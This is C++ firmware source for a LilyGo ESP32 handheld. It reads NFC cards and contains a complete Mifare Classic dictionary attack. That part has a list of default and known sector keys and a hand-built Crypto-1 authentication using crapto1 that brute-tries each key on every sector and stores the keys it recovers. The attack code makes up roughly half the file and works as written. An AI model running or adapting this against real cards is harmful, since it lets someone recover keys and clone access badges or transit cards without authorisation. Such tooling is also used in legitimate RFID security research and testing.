#include "mifare.h"
#include <LilyGoLib.h>
#include <string.h>
#include <stdio.h>
#include "crapto1.h"
#include "nfc_crypto.h"     // oddparity8()
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

// Mirrors nfc_screen.cpp's session handling (LilyGoLib `instance` + `NFCReader`).

static bool         s_powered = false;
static bool         s_scanning = false;
static volatile bool s_card_ready = false;
static bool         s_have_card = false;
static MifareCard   s_card;
static volatile bool s_dict_running = false;   // dict task owns the RFAL while set

// Called from within NFCReader.rfalNfcWorker() when a device is activated.
static void on_rfal_notify(rfalNfcState st)
{
    if (st == RFAL_NFC_STATE_ACTIVATED)
        s_card_ready = true;
}

static void start_discovery()
{
    rfalNfcDiscoverParam p;
    memset(&p, 0, sizeof(p));
    p.devLimit      = 1;
    p.techs2Find    = RFAL_NFC_POLL_TECH_A;
    p.GBLen         = RFAL_NFCDEP_GB_MAX_LEN;
    p.notifyCb      = on_rfal_notify;
    p.totalDuration = 1000U;
    p.wakeupEnabled = false;
    NFCReader.rfalNfcDiscover(&p);
    s_scanning = true;
}

static void classify(MifareCard *c)
{
    switch (c->sak) {
    case 0x08: strncpy(c->type, "MF Classic 1K", sizeof(c->type));  c->sectors = 16; c->is_classic = true;  break;
    case 0x18: strncpy(c->type, "MF Classic 4K", sizeof(c->type));  c->sectors = 40; c->is_classic = true;  break;
    case 0x09: strncpy(c->type, "MF Mini",       sizeof(c->type));  c->sectors = 5;  c->is_classic = true;  break;
    case 0x00: strncpy(c->type, (c->uidlen == 7) ? "NTAG/Ultralight" : "MF UL", sizeof(c->type)); c->sectors = 0; c->is_classic = false; break;
    case 0x20: strncpy(c->type, "ISO14443-4/DESFire", sizeof(c->type)); c->sectors = 0; c->is_classic = false; break;
    default:   snprintf(c->type, sizeof(c->type), "SAK:0x%02X", c->sak); c->sectors = 0; c->is_classic = false; break;
    }
    c->type[sizeof(c->type) - 1] = '\0';
}

static void read_active_device()
{
    rfalNfcDevice *dev = nullptr;
    NFCReader.rfalNfcGetActiveDevice(&dev);
    if (!dev) return;

    MifareCard c;
    memset(&c, 0, sizeof(c));
    c.uidlen = dev->nfcidLen > 10 ? 10 : dev->nfcidLen;
    memcpy(c.uid, dev->nfcid, c.uidlen);

    if (dev->type == RFAL_NFC_LISTEN_TYPE_NFCA) {
        c.sak     = dev->dev.nfca.selRes.sak;
        c.atqa[0] = dev->dev.nfca.sensRes.anticollisionInfo;
        c.atqa[1] = dev->dev.nfca.sensRes.platformInfo;
    }
    classify(&c);

    s_card = c;
    s_have_card = true;
}

void mifare_reader_start()
{
    s_have_card = false;
    s_card_ready = false;
    instance.powerControl(POWER_NFC, true);
    instance.initNFC();
    s_powered = true;
    start_discovery();
}

void mifare_reader_stop()
{
    if (s_scanning) {
        NFCReader.rfalNfcDeactivate(false);
        s_scanning = false;
    }
    if (s_powered) {
        instance.powerControl(POWER_NFC, false);
        s_powered = false;
    }
    s_card_ready = false;
}

void mifare_reader_worker()
{
    if (s_dict_running) return;    // the dict task drives the RFAL exclusively
    if (!s_powered || !s_scanning) return;
    NFCReader.rfalNfcWorker();

    if (s_card_ready) {
        s_card_ready = false;
        read_active_device();
        NFCReader.rfalNfcDeactivate(true);
        NFCReader.rfalNfcaPollerSleep();
        s_scanning = false;
        // Re-arm so lifting and re-tapping a card refreshes the read.
        start_discovery();
    }
}

bool mifare_have_card() { return s_have_card; }

bool mifare_get_card(MifareCard *out)
{
    if (!s_have_card || !out) return false;
    *out = s_card;
    return true;
}

void mifare_forget_card()
{
    s_have_card = false;
    if (s_powered && !s_scanning) start_discovery();
}

// ============================================================================
//  Real Mifare Classic dictionary attack (crapto1 reader-side auth)
// ============================================================================

// Frame-wait time for the auth transceives (RFAL 1/fc units, tunable on HW).
#define MF_FWT  72000U

static const uint8_t DICT[][6] = {
    { 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF }, { 0x00,0x00,0x00,0x00,0x00,0x00 },
    { 0xA0,0xA1,0xA2,0xA3,0xA4,0xA5 }, { 0xB0,0xB1,0xB2,0xB3,0xB4,0xB5 },
    { 0xD3,0xF7,0xD3,0xF7,0xD3,0xF7 }, { 0x4D,0x3A,0x99,0xC3,0x51,0xDD },
    { 0x1A,0x98,0x2C,0x7E,0x45,0x9A }, { 0xAA,0xBB,0xCC,0xDD,0xEE,0xFF },
    { 0x71,0x4C,0x5C,0x88,0x6E,0x97 }, { 0x58,0x7E,0xE5,0xF9,0x35,0x0F },
    { 0xA0,0x47,0x8C,0xC3,0x90,0x91 }, { 0x53,0x3C,0xB6,0xC7,0x23,0xF6 },
    { 0x8F,0xD0,0xA4,0xF2,0x56,0xE9 }, { 0x06,0x07,0x08,0x09,0x0A,0x0B },
};
static const int DICT_N = sizeof(DICT) / sizeof(DICT[0]);

// per-sector results (40 = 4K max)
static bool         s_sec_done[40];
static uint8_t      s_sec_keytype[40];
static uint8_t      s_sec_key[40][6];
static volatile int s_dict_sector = 0;
static volatile int s_dict_total  = 16;
static volatile int s_dict_found  = 0;
static TaskHandle_t s_dict_task = nullptr;

static inline uint32_t be32(const uint8_t *p) {
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) | ((uint32_t)p[2] << 8) | p[3];
}
static inline uint64_t key48(const uint8_t *k) {
    return ((uint64_t)k[0] << 40) | ((uint64_t)k[1] << 32) | ((uint64_t)k[2] << 24) |
           ((uint64_t)k[3] << 16) | ((uint64_t)k[4] << 8)  |  (uint64_t)k[5];
}
static int sector_first_block(int sec) {
    return (sec < 32) ? sec * 4 : 128 + (sec - 32) * 16;
}

// Re-select the card (a failed Mifare auth halts it, so every attempt restarts
// from discovery). Returns true once a device is activated again.
static bool reselect_card() {
    NFCReader.rfalNfcDeactivate(false);
    s_card_ready = false;
    start_discovery();
    uint32_t t = millis();
    while (!s_card_ready && (millis() - t) < 250) { NFCReader.rfalNfcWorker(); delay(2); }
    return s_card_ready;
}

// One real Crypto-1 authentication attempt on the (already selected) card.
// true ONLY if the card's aT decrypts to suc3(nt) — a wrong key can't fake this.
static bool mf_auth(uint8_t block, uint8_t keytype, const uint8_t key[6], const uint8_t uid4[4]) {
    RfalRfClass *rf = NFCReader.getRfalRf();
    if (!rf) return false;

    // (1) auth command -> tag nonce nt (4 bytes, no CRC on the response)
    uint8_t cmd[2] = { (uint8_t)(keytype ? 0x61 : 0x60), block };
    uint8_t rx[16]; uint16_t rxlen = 0;
    if (rf->rfalTransceiveBlockingTxRx(cmd, 2, rx, sizeof(rx), &rxlen,
            RFAL_TXRX_FLAGS_DEFAULT | (uint32_t)RFAL_TXRX_FLAGS_CRC_RX_KEEP, MF_FWT) != ST_ERR_NONE)
        return false;
    if (rxlen < 4) return false;
    uint32_t nt = be32(rx);

    // (2) init cipher, absorb uid ^ nt
    struct Crypto1State cs;
    crypto1_init(&cs, key48(key));
    crypto1_word(&cs, be32(uid4) ^ nt, 0);

    // (3) build {nR}{aR} with encrypted parity. nr = 0; aR = suc2(nt).
    uint8_t nr[4] = { 0, 0, 0, 0 };
    uint32_t ar = prng_successor(nt, 64);
    uint8_t arb[4] = { (uint8_t)(ar >> 24), (uint8_t)(ar >> 16), (uint8_t)(ar >> 8), (uint8_t)ar };
    uint8_t tok[8], par[8];
    for (int i = 0; i < 4; i++) {                    // {nR}: feed plaintext nr
        uint8_t ks = crypto1_byte(&cs, nr[i], 0);
        tok[i] = ks ^ nr[i];
        par[i] = oddparity8(nr[i]) ^ (uint8_t)cr1_filter(cs.odd);
    }
    for (int i = 0; i < 4; i++) {                    // {aR}: keystream only
        uint8_t ks = crypto1_byte(&cs, 0, 0);
        tok[4 + i] = ks ^ arb[i];
        par[4 + i] = oddparity8(arb[i]) ^ (uint8_t)cr1_filter(cs.odd);
    }
    // pack 8 data bytes + 8 encrypted parity bits into 72 bits (9 bytes, LSB-first)
    uint8_t txb[9]; memset(txb, 0, sizeof(txb));
    int bp = 0;
    for (int i = 0; i < 8; i++) {
        for (int b = 0; b < 8; b++) { if ((tok[i] >> b) & 1) txb[bp >> 3] |= 1 << (bp & 7); bp++; }
        if (par[i] & 1) txb[bp >> 3] |= 1 << (bp & 7); bp++;
    }

    // (4) send with manual CRC + software parity; keep rx parity/CRC bits
    uint32_t flags = (uint32_t)RFAL_TXRX_FLAGS_DEFAULT
                   | (uint32_t)RFAL_TXRX_FLAGS_CRC_TX_MANUAL
                   | (uint32_t)RFAL_TXRX_FLAGS_CRC_RX_KEEP
                   | (uint32_t)RFAL_TXRX_FLAGS_PAR_TX_NONE
                   | (uint32_t)RFAL_TXRX_FLAGS_PAR_RX_KEEP;
    uint8_t rx2[16]; uint16_t rx2len = 0;
    if (rf->rfalTransceiveBlockingTxRx(txb, 9, rx2, sizeof(rx2), &rx2len, flags, MF_FWT) != ST_ERR_NONE)
        return false;                                 // wrong key -> card stays silent
    if (rx2len < 4) return false;

    // (5) unpack aT (4 bytes, stripping the parity bit after each), decrypt, verify
    uint8_t at_enc[4]; bp = 0;
    for (int i = 0; i < 4; i++) {
        uint8_t v = 0;
        for (int b = 0; b < 8; b++) { if ((rx2[bp >> 3] >> (bp & 7)) & 1) v |= 1 << b; bp++; }
        at_enc[i] = v; bp++;                          // skip parity bit
    }
    uint8_t at_plain[4];
    for (int i = 0; i < 4; i++) at_plain[i] = at_enc[i] ^ crypto1_byte(&cs, 0, 0);
    return be32(at_plain) == prng_successor(nt, 96);
}

static void dict_task(void *) {
    MifareCard c;
    if (mifare_get_card(&c) && c.is_classic) {
        uint8_t uid4[4] = { c.uid[0], c.uid[1], c.uid[2], c.uid[3] };
        s_dict_total = c.sectors;
        s_dict_found = 0;
        memset(s_sec_done, 0, sizeof(s_sec_done));

        for (int sec = 0; sec < s_dict_total && s_dict_running; sec++) {
            s_dict_sector = sec;
            int block = sector_first_block(sec);
            for (int k = 0; k < DICT_N && s_dict_running; k++) {
                if (reselect_card() && mf_auth(block, 0, DICT[k], uid4)) {
                    s_sec_done[sec] = true; s_sec_keytype[sec] = 0;
                    memcpy(s_sec_key[sec], DICT[k], 6); s_dict_found++; break;
                }
                if (reselect_card() && mf_auth(block, 1, DICT[k], uid4)) {
                    s_sec_done[sec] = true; s_sec_keytype[sec] = 1;
                    memcpy(s_sec_key[sec], DICT[k], 6); s_dict_found++; break;
                }
            }
        }
    }
    NFCReader.rfalNfcDeactivate(false);
    s_dict_running = false;
    s_dict_task = nullptr;
    vTaskDelete(nullptr);
}

bool mifare_dict_start() {
    if (s_dict_running) return true;
    if (!s_have_card || !s_card.is_classic) return false;
    s_dict_sector = 0; s_dict_found = 0; s_dict_total = s_card.sectors;
    memset(s_sec_done, 0, sizeof(s_sec_done));
    s_dict_running = true;
    if (xTaskCreatePinnedToCore(dict_task, "mfdict", 4096, nullptr, 1, &s_dict_task, 0) != pdPASS) {
        s_dict_running = false;
        return false;
    }
    return true;
}

void mifare_dict_stop() {
    if (!s_dict_running) return;
    s_dict_running = false;
    for (int i = 0; i < 100 && s_dict_task; i++) delay(5);
}

bool mifare_dict_running() { return s_dict_running; }
int  mifare_dict_found()   { return s_dict_found; }
int  mifare_dict_total()   { return s_dict_total; }
int  mifare_dict_progress() {
    if (s_dict_total <= 0) return 0;
    int p = (s_dict_sector * 100) / s_dict_total;
    return p > 100 ? 100 : p;
}
bool mifare_dict_key(int sec, uint8_t *keytype, uint8_t key[6]) {
    if (sec < 0 || sec >= 40 || !s_sec_done[sec]) return false;
    if (keytype) *keytype = s_sec_keytype[sec];
    if (key) memcpy(key, s_sec_key[sec], 6);
    return true;
}
